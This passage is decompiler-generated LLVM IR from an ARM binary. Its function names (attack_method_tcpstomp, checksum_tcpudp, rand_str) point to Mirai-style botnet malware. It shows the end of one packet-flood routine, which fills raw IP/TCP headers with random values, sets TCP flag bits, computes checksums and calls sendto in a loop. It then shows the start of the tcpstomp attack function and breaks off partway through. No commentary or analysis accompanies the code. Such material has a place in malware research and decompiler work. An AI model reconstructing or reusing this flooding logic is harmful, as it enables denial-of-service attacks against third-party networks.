  %v0_b0f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0f0 = add i32 %v0_b0f0, 4
  %v2_b0f0 = inttoptr i32 %v1_b0f0 to i32*
  %v3_b0f0 = load i32, i32* %v2_b0f0, align 4
  store i32 %v3_b0f0, i32* %r1.global-to-local, align 4
  %v1_b0f4 = add i32 %v0_b0f0, 14
  %v2_b0f4 = inttoptr i32 %v1_b0f4 to i16*
  %v3_b0f4 = load i16, i16* %v2_b0f4, align 2
  %v4_b0f4 = zext i16 %v3_b0f4 to i32
  store i32 %v4_b0f4, i32* %r3.global-to-local, align 4
  %v1_b0f8 = trunc i32 %v1_b0ec to i8
  %v2_b0f8 = load i32, i32* @r8, align 4
  %v3_b0f8 = add i32 %v2_b0f8, 13
  %v4_b0f8 = inttoptr i32 %v3_b0f8 to i8*
  store i8 %v1_b0f8, i8* %v4_b0f8, align 1
  %v0_b0fc = load i32, i32* %r3.global-to-local, align 4
  %v1_b0fc = trunc i32 %v0_b0fc to i16
  %v2_b0fc = load i32, i32* @r8, align 4
  %v3_b0fc = add i32 %v2_b0fc, 2
  %v4_b0fc = inttoptr i32 %v3_b0fc to i16*
  store i16 %v1_b0fc, i16* %v4_b0fc, align 2
  %v0_b100 = load i32, i32* @r8, align 4
  %v1_b100 = add i32 %v0_b100, 12
  %v2_b100 = inttoptr i32 %v1_b100 to i8*
  %v3_b100 = load i8, i8* %v2_b100, align 1
  %v4_b100 = zext i8 %v3_b100 to i32
  store i32 %v4_b100, i32* %r3.global-to-local, align 4
  %v1_b104 = add i32 %v0_b100, 13
  %v2_b104 = inttoptr i32 %v1_b104 to i8*
  %v3_b104 = load i8, i8* %v2_b104, align 1
  %v4_b104 = zext i8 %v3_b104 to i32
  %tmp104 = urem i8 %v3_b100, 16
  %v1_b108 = zext i8 %tmp104 to i32
  %v1_b10c = or i32 %v1_b108, 128
  store i32 %v1_b10c, i32* %r3.global-to-local, align 4
  %v1_b110 = or i32 %v4_b104, 16
  store i32 %v1_b110, i32* %r2.global-to-local, align 4
  %v0_b114 = load i32, i32* %r1.global-to-local, align 4
  %v2_b114 = add i32 %v0_b100, 8
  %v3_b114 = inttoptr i32 %v2_b114 to i32*
  store i32 %v0_b114, i32* %v3_b114, align 4
  %v0_b118 = load i32, i32* %r3.global-to-local, align 4
  %v1_b118 = trunc i32 %v0_b118 to i8
  %v2_b118 = load i32, i32* @r8, align 4
  %v3_b118 = add i32 %v2_b118, 12
  %v4_b118 = inttoptr i32 %v3_b118 to i8*
  store i8 %v1_b118, i8* %v4_b118, align 1
  %v0_b11c = load i32, i32* %r2.global-to-local, align 4
  %v1_b11c = trunc i32 %v0_b11c to i8
  %v2_b11c = load i32, i32* @r8, align 4
  %v3_b11c = add i32 %v2_b11c, 13
  %v4_b11c = inttoptr i32 %v3_b11c to i8*
  store i8 %v1_b11c, i8* %v4_b11c, align 1
  %v0_b120 = call i32 @rand_next()
  %v1_b120 = trunc i32 %v0_b120 to i16
  store i32 %v0_b120, i32* %r0.global-to-local, align 4
  store i32 %v1_ac64, i32* %r1.global-to-local, align 4
  %v0_b128 = load i32, i32* @r8, align 4
  %v1_b128 = add i32 %v0_b128, 13
  %v2_b128 = inttoptr i32 %v1_b128 to i8*
  %v3_b128 = load i8, i8* %v2_b128, align 1
  %v4_b128 = zext i8 %v3_b128 to i32
  store i32 %v1_b12c, i32* %r2.global-to-local, align 4
  %v1_b130 = and i32 %v4_b128, 223
  %v5_b134 = or i32 %v1_b130, %v4_b134
  store i32 %v5_b134, i32* %r3.global-to-local, align 4
  %v1_b138 = trunc i32 %v5_b134 to i8
  store i8 %v1_b138, i8* %v2_b128, align 1
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_b140 = load i32, i32* @r8, align 4
  %v1_b140 = add i32 %v0_b140, 13
  %v2_b140 = inttoptr i32 %v1_b140 to i8*
  %v3_b140 = load i8, i8* %v2_b140, align 1
  %v4_b140 = zext i8 %v3_b140 to i32
  store i32 %v1_b144, i32* %r3.global-to-local, align 4
  %v1_b148 = and i32 %v4_b140, 239
  %v5_b14c = or i32 %v1_b148, %v4_b14c
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v1_b150 = trunc i32 %v5_b14c to i8
  store i8 %v1_b150, i8* %v2_b140, align 1
  store i32 %v1_aca4, i32* %r1.global-to-local, align 4
  %v0_b158 = load i32, i32* @r8, align 4
  %v1_b158 = add i32 %v0_b158, 13
  %v2_b158 = inttoptr i32 %v1_b158 to i8*
  %v3_b158 = load i8, i8* %v2_b158, align 1
  %v4_b158 = zext i8 %v3_b158 to i32
  store i32 %v1_b15c, i32* %r2.global-to-local, align 4
  %v1_b160 = and i32 %v4_b158, 247
  %v5_b164 = or i32 %v1_b160, %v4_b164
  store i32 %v5_b164, i32* %r3.global-to-local, align 4
  %v1_b168 = trunc i32 %v5_b164 to i8
  store i8 %v1_b168, i8* %v2_b158, align 1
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_b170 = load i32, i32* @r8, align 4
  %v1_b170 = add i32 %v0_b170, 13
  %v2_b170 = inttoptr i32 %v1_b170 to i8*
  %v3_b170 = load i8, i8* %v2_b170, align 1
  %v4_b170 = zext i8 %v3_b170 to i32
  store i32 %v1_b174, i32* %r3.global-to-local, align 4
  %v1_b178 = and i32 %v4_b170, 251
  %v5_b17c = or i32 %v1_b178, %v4_b17c
  store i32 %v5_b17c, i32* %r2.global-to-local, align 4
  %v1_b180 = trunc i32 %v5_b17c to i8
  store i8 %v1_b180, i8* %v2_b170, align 1
  store i32 %v1_ace4, i32* %r1.global-to-local, align 4
  %v0_b188 = load i32, i32* @r8, align 4
  %v1_b188 = add i32 %v0_b188, 13
  %v2_b188 = inttoptr i32 %v1_b188 to i8*
  %v3_b188 = load i8, i8* %v2_b188, align 1
  %v4_b188 = zext i8 %v3_b188 to i32
  store i32 %v1_b18c, i32* %r2.global-to-local, align 4
  %v1_b190 = and i32 %v4_b188, 253
  %v4_b194 = or i32 %v1_b190, %v3_b194
  store i32 %v4_b194, i32* %r3.global-to-local, align 4
  %v1_b198 = trunc i32 %v4_b194 to i8
  store i8 %v1_b198, i8* %v2_b188, align 1
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  %v0_b1a0 = load i32, i32* @r8, align 4
  %v1_b1a0 = add i32 %v0_b1a0, 13
  %v2_b1a0 = inttoptr i32 %v1_b1a0 to i8*
  %v3_b1a0 = load i8, i8* %v2_b1a0, align 1
  %v4_b1a0 = zext i8 %v3_b1a0 to i32
  %v1_b1a8 = and i32 %v4_b1a0, 254
  store i32 %v1_b1a8, i32* %r2.global-to-local, align 4
  %v2_b1ac = or i32 %v1_b1a8, %v1_b1a4
  store i32 %v2_b1ac, i32* %r3.global-to-local, align 4
  %v1_b1b0 = trunc i32 %v2_b1ac to i8
  store i8 %v1_b1b0, i8* %v2_b1a0, align 1
  %v3_b1b4 = load i32, i32* @r8, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 14
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v1_b120, i16* %v5_b1b4, align 2
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v0_b1bc = load i32, i32* @r4, align 4
  %v1_b1bc = add i32 %v0_b1bc, 40
  store i32 %v1_b1bc, i32* %r0.global-to-local, align 4
  %v2_b1c0 = inttoptr i32 %v1_b1bc to i16*
  %v3_b1c0 = call i32 @rand_str(i16* %v2_b1c0, i32 %v6_ad1c)
  store i32 %v3_b1c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af14

dec_label_pc_b1c8:                                ; preds = %dec_label_pc_ad88
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_ad1c, 40
  br label %dec_label_pc_b1d8

dec_label_pc_b1d8:                                ; preds = %dec_label_pc_af28, %dec_label_pc_b1c8
  %storemerge6.pre-phi = phi i32 [ %v1_b018, %dec_label_pc_af28 ], [ %.pre, %dec_label_pc_b1c8 ]
  %v0_b1ec26 = phi i32 [ %v1_af1c, %dec_label_pc_af28 ], [ 0, %dec_label_pc_b1c8 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_ad1c, 65536
  %storemerge = add i32 %v6_ad1c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b1d8 = add i32 %storemerge4, 1310720
  store i32 %v1_b1d8, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b1d8, 256
  %v3_b1e0 = and i32 %tmp83, 65280
  store i32 %v3_b1e0, i32* %r3.global-to-local, align 4
  %v4_b1e4 = udiv i32 %v1_b1d8, 16777216
  %v5_b1e4 = or i32 %v3_b1e0, %v4_b1e4
  store i32 %v5_b1e4, i32* @r8, align 4
  %v2_b310 = icmp eq i32 %v1_ad3c, 0
  br label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4, %dec_label_pc_b1d8
  %v0_b1ec = phi i32 [ %v0_b1ec26, %dec_label_pc_b1d8 ], [ 0, %dec_label_pc_b2f4 ], [ 0, %dec_label_pc_b1e8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b1ec = icmp eq i32 %v0_b1ec, 0
  store i1 %v2_b1ec, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b1ec, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b1f8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1fc

dec_label_pc_b1fc:                                ; preds = %dec_label_pc_b224, %dec_label_pc_b1f8
  %v1_b204 = phi i32 [ %v1_b2e4, %dec_label_pc_b224 ], [ 0, %dec_label_pc_b1f8 ]
  store i32 %v2_aba8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b204 = mul i32 %v1_b204, 4
  %v5_b204 = add i32 %v4_b204, %v2_aba8
  %v6_b204 = inttoptr i32 %v5_b204 to i32*
  %v7_b204 = load i32, i32* %v6_b204, align 4
  store i32 %v7_b204, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b20c = load i32, i32* @fp, align 4
  %v9_b20c = icmp eq i32 %v0_b20c, 65535
  store i1 %v9_b20c, i1* %cpsr_z.global-to-local, align 1
  %v1_b210 = add i32 %v7_b204, 20
  store i32 %v1_b210, i32* @r5, align 4
  br i1 %v9_b20c, label %dec_label_pc_b308, label %dec_label_pc_b218

dec_label_pc_b218:                                ; preds = %dec_label_pc_b1fc
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b31c

dec_label_pc_b224:                                ; preds = %dec_label_pc_b218, %dec_label_pc_b308, %dec_label_pc_b31c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b228 = load i32, i32* @r4, align 4
  %v3_b228 = add i32 %v2_b228, 10
  %v4_b228 = inttoptr i32 %v3_b228 to i16*
  store i16 0, i16* %v4_b228, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b230 = load i32, i32* @r4, align 4
  store i32 %v0_b230, i32* @r0, align 4
  %v2_b234 = call i32 @checksum_generic(i32 %v0_b230, i32 20)
  %v3_b234 = trunc i32 %v2_b234 to i16
  store i32 %v2_b234, i32* %r0.global-to-local, align 4
  %v3_b238 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_ab98, i32* %r2.global-to-local, align 4
  %v3_b240 = mul i32 %v3_b238, 16
  %v2_b244 = add i32 %v3_b240, %v2_ab98
  store i32 %v2_b244, i32* %r1.global-to-local, align 4
  %v1_b248 = add i32 %v2_b244, 4
  %v2_b248 = inttoptr i32 %v1_b248 to i32*
  %v3_b248 = load i32, i32* %v2_b248, align 4
  %v3_b24c = mul i32 %v3_b248, 65536
  store i32 %v3_b24c, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b248, 256
  %v1_b254 = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
  %tmp86 = udiv i32 %v3_b248, 256
  %v4_b258 = urem i32 %tmp86, 256
  %v5_b258 = or i32 %v4_b258, %v1_b254
  store i32 %v5_b258, i32* %r3.global-to-local, align 4
  %v1_b25c = add i32 %v3_b248, 1
  store i32 %v1_b25c, i32* %r2.global-to-local, align 4
  store i32 %v1_b25c, i32* %v2_b248, align 4
  %v0_b264 = load i32, i32* %r3.global-to-local, align 4
  %v1_b264 = load i32, i32* @r5, align 4
  %v2_b264 = add i32 %v1_b264, 4
  %v3_b264 = inttoptr i32 %v2_b264 to i32*
  store i32 %v0_b264, i32* %v3_b264, align 4
  %v0_b268 = load i32, i32* %r1.global-to-local, align 4
  %v1_b268 = add i32 %v0_b268, 8
  %v2_b268 = inttoptr i32 %v1_b268 to i32*
  %v3_b268 = load i32, i32* %v2_b268, align 4
  %tmp87 = mul i32 %v3_b268, 256
  %v1_b274 = and i32 %tmp87, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
  %tmp88 = udiv i32 %v3_b268, 256
  %v4_b278 = urem i32 %tmp88, 256
  %v5_b278 = or i32 %v4_b278, %v1_b274
  %v1_b27c = load i32, i32* @r5, align 4
  %v2_b27c = add i32 %v1_b27c, 8
  %v3_b27c = inttoptr i32 %v2_b27c to i32*
  store i32 %v5_b278, i32* %v3_b27c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b284 = load i32, i32* @r4, align 4
  %v4_b284 = add i32 %v3_b284, 10
  %v5_b284 = inttoptr i32 %v4_b284 to i16*
  store i16 %v3_b234, i16* %v5_b284, align 2
  %v0_b288 = load i32, i32* @r5, align 4
  store i32 %v0_b288, i32* @r1, align 4
  %v0_b28c = load i32, i32* %r3.global-to-local, align 4
  %v1_b28c = trunc i32 %v0_b28c to i16
  %v3_b28c = add i32 %v0_b288, 16
  %v4_b28c = inttoptr i32 %v3_b28c to i16*
  store i16 %v1_b28c, i16* %v4_b28c, align 2
  %v0_b290 = load i32, i32* @r8, align 4
  store i32 %v0_b290, i32* %r2.global-to-local, align 4
  %v0_b294 = load i32, i32* @sl, align 4
  store i32 %v0_b294, i32* %r3.global-to-local, align 4
  %v0_b298 = load i32, i32* @r4, align 4
  store i32 %v0_b298, i32* %r0.global-to-local, align 4
  %v4_b29c = call i32 @checksum_tcpudp(i32 %v0_b298, i32 %v0_b288, i32 %v0_b290, i32 %v0_b294)
  %v5_b29c = trunc i32 %v4_b29c to i16
  store i32 %v4_b29c, i32* %r0.global-to-local, align 4
  %v3_b2a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2a0, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_b2a8 = mul i32 %v3_b2a0, 32
  store i32 %v3_b2a8, i32* %lr.global-to-local, align 4
  %v3_b2ac = load i32, i32* @r5, align 4
  %v4_b2ac = add i32 %v3_b2ac, 16
  %v5_b2ac = inttoptr i32 %v4_b2ac to i16*
  store i16 %v5_b29c, i16* %v5_b2ac, align 2
  %v0_b2b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_b2b0, -8
  %v5_b2b0 = add i32 %v0_b2b0, %tmp105
  store i32 %v5_b2b0, i32* %lr.global-to-local, align 4
  %v0_b2b4 = load i32, i32* @r5, align 4
  %v1_b2b4 = add i32 %v0_b2b4, 2
  %v2_b2b4 = inttoptr i32 %v1_b2b4 to i16*
  %v3_b2b4 = load i16, i16* %v2_b2b4, align 2
  %v4_b2b4 = zext i16 %v3_b2b4 to i32
  store i32 %v4_b2b4, i32* @r5, align 4
  %v1_b2b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b2b8 = add i32 %v1_b2b8, %v5_b2b0
  store i32 %v2_b2b8, i32* @lr, align 4
  %v3_b2bc = add i32 %v2_b2b8, 2
  %v4_b2bc = inttoptr i32 %v3_b2bc to i16*
  store i16 %v3_b2b4, i16* %v4_b2bc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b2c8 = load i32, i32* @r4, align 4
  store i32 %v0_b2c8, i32* %r1.global-to-local, align 4
  %v0_b2cc = load i32, i32* @sb, align 4
  store i32 %v0_b2cc, i32* %r0.global-to-local, align 4
  %v0_b2d0 = load i32, i32* @r7, align 4
  store i32 %v0_b2d0, i32* %r2.global-to-local, align 4
  %v0_b2d4 = load i32, i32* @lr, align 4
  %v6_b2dc = call i32 @__libc_sendto(i32 %v0_b2cc, i32 %v0_b2c8, i32 %v0_b2d0, i32 16384, i32 %v0_b2d4, i32 16)
  %v3_b2e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2e0, i32* %r3.global-to-local, align 4
  %v1_b2e4 = add i32 %v3_b2e0, 1
  store i32 %v1_b2e4, i32* %r0.global-to-local, align 4
  %v0_b2e8 = load i32, i32* @r6, align 4
  %v9_b2e8 = icmp eq i32 %v0_b2e8, %v1_b2e4
  store i1 %v9_b2e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b2e4, i32* %stack_var_-44, align 4
  %v8_b2f0 = icmp sgt i32 %v0_b2e8, %v1_b2e4
  br i1 %v8_b2f0, label %dec_label_pc_b1fc, label %dec_label_pc_b2f4

dec_label_pc_b2f4:                                ; preds = %dec_label_pc_b224
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b2f8 = icmp eq i32 %v0_b2e8, 0
  store i1 %v2_b2f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b2f8, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b308:                                ; preds = %dec_label_pc_b1fc
  %v0_b308 = call i32 @rand_next()
  %v1_b308 = trunc i32 %v0_b308 to i16
  store i32 %v0_b308, i32* %r0.global-to-local, align 4
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  %v3_b314 = load i32, i32* @r4, align 4
  %v4_b314 = add i32 %v3_b314, 4
  %v5_b314 = inttoptr i32 %v4_b314 to i16*
  store i16 %v1_b308, i16* %v5_b314, align 2
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b308.dec_label_pc_b31c_crit_edge

dec_label_pc_b308.dec_label_pc_b31c_crit_edge:    ; preds = %dec_label_pc_b308
  %v0_b31c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b31c

dec_label_pc_b31c:                                ; preds = %dec_label_pc_b308.dec_label_pc_b31c_crit_edge, %dec_label_pc_b218
  %v0_b31c = phi i32 [ %v0_b31c.pre, %dec_label_pc_b308.dec_label_pc_b31c_crit_edge ], [ %v7_b204, %dec_label_pc_b218 ]
  %v1_b31c = add i32 %v0_b31c, 40
  store i32 %v1_b31c, i32* %r0.global-to-local, align 4
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v2_b324 = inttoptr i32 %v1_b31c to i16*
  %v3_b324 = call i32 @rand_str(i16* %v2_b324, i32 %v6_ad1c)
  store i32 %v3_b324, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b224

; uselistorder directives
  uselistorder i32 %v0_b308, { 1, 0 }
  uselistorder i32 %v1_b2e4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b2b0, { 1, 0 }
  uselistorder i32 %v4_b29c, { 1, 0 }
  uselistorder i32 %v3_b268, { 1, 0 }
  uselistorder i32 %v3_b248, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b234, { 1, 0 }
  uselistorder i1 %v2_b310, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b120, { 1, 0 }
  uselistorder i32 %v0_b058, { 1, 0 }
  uselistorder i32 %v3_aff4, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_afc8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_afac, { 1, 0 }
  uselistorder i32 %v0_af68, { 0, 2, 1, 3 }
  uselistorder i32 %v1_af18, { 1, 0, 2, 3 }
  uselistorder i32 %v3_af04, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_ae90, { 1, 0 }
  uselistorder i32 %v6_ae88, { 0, 2, 1, 3 }
  uselistorder i1 %v9_aeb8, { 1, 0 }
  uselistorder i32 %v4_aecc, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ae14, { 1, 0, 2 }
  uselistorder i32 %v0_afc4, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_ae04, { 1, 0 }
  uselistorder i1 %v7_adfc, { 1, 0, 2 }
  uselistorder i1 %v7_adb0, { 1, 0 }
  uselistorder i32 %v3_adac, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b18c, { 1, 0 }
  uselistorder i32 %v1_b174, { 1, 0 }
  uselistorder i32 %v1_b15c, { 1, 0 }
  uselistorder i32 %v1_b144, { 1, 0 }
  uselistorder i32 %v1_b12c, { 1, 0 }
  uselistorder i32 %v3_aec4, { 1, 0 }
  uselistorder i1 %v2_aee0, { 1, 0 }
  uselistorder i32 %v1_aedc, { 1, 0 }
  uselistorder i32 %v4_aed8, { 2, 0, 1 }
  uselistorder i32 %v2_adec, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_ad88, { 1, 0 }
  uselistorder i1 %v7_ad80, { 1, 0 }
  uselistorder i1 %v7_ad54, { 1, 0 }
  uselistorder i32 %v3_ad50, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_ad3c, { 2, 3, 1, 0 }
  uselistorder i32 %v6_ad1c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_ad04, { 1, 0 }
  uselistorder i32 %v1_ace4, { 1, 0 }
  uselistorder i32 %v1_acc4, { 1, 0 }
  uselistorder i32 %v1_aca4, { 1, 0 }
  uselistorder i32 %v1_ac84, { 1, 0 }
  uselistorder i32 %v1_ac64, { 1, 0 }
  uselistorder i32 %v6_ac40, { 1, 0 }
  uselistorder i32 %v1_ac28, { 1, 0 }
  uselistorder i8 %v5_abe0, { 1, 0 }
  uselistorder i32 %v6_abc0, { 1, 0 }
  uselistorder i32 %v2_aba8, { 0, 3, 1, 2 }
  uselistorder i32 %v2_ab98, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b224, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1f8, { 1, 0 }
  uselistorder label %dec_label_pc_b1e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1d8, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_af44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_af14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ae50, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ae30, { 1, 0 }
  uselistorder label %dec_label_pc_ae0c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_adbc, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 1, 0 }
}

define i32 @attack_method_tcpstomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_b330 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b34c = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b358 = load i32, i32* @r6, align 4
  store i32 %v0_b358, i32* %r0.global-to-local, align 4
  %v2_b35c = call i32 @calloc(i32 %v0_b358, i32 4)
  %v0_b360 = load i32, i32* @r5, align 4
  store i32 %v0_b360, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b370 = load i32, i32* @r4, align 4
  store i32 %v0_b370, i32* %r0.global-to-local, align 4
  %v5_b374 = inttoptr i32 %v0_b360 to i32*
  %v6_b374 = call i32 @attack_get_opt_int(i32 %v0_b370, i32* %v5_b374, i32 2, i32 0)
  %v1_b380 = urem i32 %v6_b374, 256
  store i32 %v1_b380, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b38c = load i32, i32* @r5, align 4
  store i32 %v0_b38c, i32* %r1.global-to-local, align 4
  %v0_b390 = load i32, i32* @r4, align 4
  store i32 %v0_b390, i32* %r0.global-to-local, align 4
  %v5_b394 = trunc i32 %v6_b374 to i8
  %v6_b398 = inttoptr i32 %v0_b38c to i32*
  %v7_b398 = call i32 @attack_get_opt_int(i32 %v0_b390, i32* %v6_b398, i32 3, i32 65535)
  %v0_b39c = load i32, i32* @r5, align 4
  store i32 %v0_b39c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b398, i32* @r7, align 4
  %v0_b3ac = load i32, i32* @r4, align 4
  store i32 %v0_b3ac, i32* %r0.global-to-local, align 4
  %v4_b3b0 = inttoptr i32 %v0_b39c to i32*
  %v5_b3b0 = call i32 @attack_get_opt_int(i32 %v0_b3ac, i32* %v4_b3b0, i32 4, i32 64)
  %v1_b3b8 = urem i32 %v5_b3b0, 256
  store i32 %v1_b3b8, i32* %ip.global-to-local, align 4
  %v0_b3bc = load i32, i32* @r5, align 4
  store i32 %v0_b3bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b3c8 = load i32, i32* @r4, align 4
  store i32 %v0_b3c8, i32* %r0.global-to-local, align 4
  %v6_b3d0 = inttoptr i32 %v0_b3bc to i32*
